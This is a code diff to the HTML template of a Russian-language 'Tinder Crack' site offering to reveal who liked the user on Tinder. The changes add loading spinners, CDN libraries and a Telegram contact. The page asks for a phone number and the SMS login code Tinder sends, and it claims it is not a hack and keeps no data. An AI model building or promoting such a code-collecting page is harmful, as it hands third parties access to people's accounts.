@@ -7,6 +7,10 @@
     <link rel="shortcut icon" href="/favicon.ico" type="image/png">
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
     <link rel="stylesheet" href="/css/magnific-popup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+
     <title>Tinder Crack</title>
     <!-- Yandex.Metrika counter -->
     <script type="text/javascript" >
@@ -55,19 +59,36 @@
                             <input type="text" class="form-control phone" id="phone_number" name="phone_number" aria-describedby="phoneNumberHelp" placeholder="+7 ">
                             <small id="emailHelp" class="form-text text-muted">Номер телефона необходим для поиска вашего профиля в Tinder.</small>
                         </div>
-                        <button type="submit" class="btn btn-lg btn-block btn-primary">Отправить sms</button>
+                        <button type="submit" class="btn btn-lg btn-block btn-primary button-send-phone">
+                            <span class="btn-send-phone-text">
+                                Отправить sms
+                            </span>
+                            <span class="btn-send-phone-text-load" style="display: none">
+                                <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+                                Загрузка...
+                            </span>
+                        </button>
                     </form>
                     <form action="{{ path('app_default_confirmlogin') }}" id="account_kit_confirm_login" style="display: none;">
                         <div class="form-group">
                             <label for="sms_code">Код из смс</label>
-                            <input type="text" class="form-control" id="sms_code" name="sms_code" aria-describedby="smsCodeHelp">
+                            <input type="text" class="form-control" id="sms_code" name="sms_code" aria-describedby="smsCodeHelp" autocomplete="off">
                             <small id="smsCodeHelp" class="form-text text-muted">Введите код из смс. Мы сможем найти ваш профиль</small>
                         </div>
-                        <button type="submit" class="btn btn-lg btn-block btn-primary">Отправить код</button>
+                        <button type="submit" class="btn btn-lg btn-block btn-primary button-send-sms">
+                            <span class="btn-send-sms-text">
+                                Отправить код
+                            </span>
+                            <span class="btn-send-phone-sms-load" style="display: none">
+                                <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+                                Загрузка...
+                            </span>
+                        </button>
                     </form>
                 </div>
                 <div class="card-footer text-muted">
                     <div>Сервис предоставляет возможность узнать кто ставил вам лайки в приложении Tinder. Реализация получена из открытых источников и не является взломом офицального приложения Tinder. Использование сервиса не компроментирует ваш аккаунт в Tinder. Мы не храним ваши данные. Первое правило сервиса: все, что вы наблюдаете в браузере остается только в памяти браузера.</div>
+                    <div class="text-center"><a href="tg://resolve?domain=<USERNAME>"><i class="fa fa-telegram" aria-hidden="true"></i> revil_on</a></div>
                     <div class="text-center">© {{ 'now'|date('Y') }}</div>
                 </div>
             </div>
@@ -80,7 +101,8 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
-<script src="/js/jquery.magnific-popup.min.js"></script>
-<script src="/js/app.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-noty/2.4.1/packaged/jquery.noty.packaged.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+<script src="/js/app.js?v=2"></script>
 </body>
 </html>
